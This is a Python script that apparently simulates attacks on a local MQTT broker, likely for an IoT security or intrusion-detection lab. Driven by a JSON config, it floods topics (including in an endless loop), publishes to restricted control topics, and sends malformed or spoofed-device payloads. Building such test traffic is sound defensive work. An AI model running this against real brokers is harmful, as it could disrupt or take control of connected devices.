import argparse
import json
import time
from datetime import datetime
import paho.mqtt.client as mqtt

BROKER = "localhost"
PORT = 1883

RESTRICTED_TOPICS = ["admin/control", "system/config"]
KNOWN_DEVICES = [
    "temp_sensor_01",
    "humidity_sensor_01",
    "attacker_flood_01",
    "attacker_unauthorized_01"
]


def build_payload(config, sequence):
    device_id = config.get("device_id", "attacker_custom_01")
    behaviours = config.get("behaviours", [])
    sensor_type = config.get("sensor_type", "temperature")
    sensor_value = config.get("sensor_value", "30")
    payload_type = config.get("payload_type", "json")

    if "unknown" in behaviours and device_id in KNOWN_DEVICES:
        device_id = "unknown_custom_device"

    if "malformed" in behaviours or payload_type == "malformed":
        return f"device={device_id}, {sensor_type}==???, sequence={sequence}"

    if payload_type == "plain":
        return f"device={device_id}; {sensor_type}={sensor_value}; sequence={sequence}"

    payload = {
        "device": device_id,
        sensor_type: sensor_value,
        "sequence": sequence,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    return str(payload)


def run_attack(config):
    behaviours = config.get("behaviours", [])
    topic = config.get("topic", "home/temperature")
    mode = config.get("mode", "fixed")
    repeat_count = int(config.get("repeat_count", 1))
    delay_ms = int(config.get("delay_ms", 100))
    delay_seconds = delay_ms / 1000

    if "unauthorized" in behaviours and topic not in RESTRICTED_TOPICS:
        topic = "admin/control"

    client = mqtt.Client()
    client.connect(BROKER, PORT, 60)

    print("[CUSTOM ATTACK] Started")
    print(f"[CUSTOM ATTACK] Topic: {topic}")
    print(f"[CUSTOM ATTACK] Mode: {mode}")
    print(f"[CUSTOM ATTACK] Behaviours: {behaviours}")

    counter = 0

    try:
        if mode == "infinite":
            while True:
                counter += 1
                payload = build_payload(config, counter)
                client.publish(topic, payload)
                print(f"[CUSTOM ATTACK] Message {counter} sent -> {topic}")
                time.sleep(delay_seconds)
        else:
            for i in range(repeat_count):
                counter += 1
                payload = build_payload(config, counter)
                client.publish(topic, payload)
                print(f"[CUSTOM ATTACK] Message {counter} sent -> {topic}")
                time.sleep(delay_seconds)

    except KeyboardInterrupt:
        print("[CUSTOM ATTACK] Stopped by user.")

    finally:
        client.disconnect()
        print("[CUSTOM ATTACK] Completed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--config", required=True)
    args = parser.parse_args()

    with open(args.config, "r") as file:
        attack_config = json.load(file)

    run_attack(attack_config)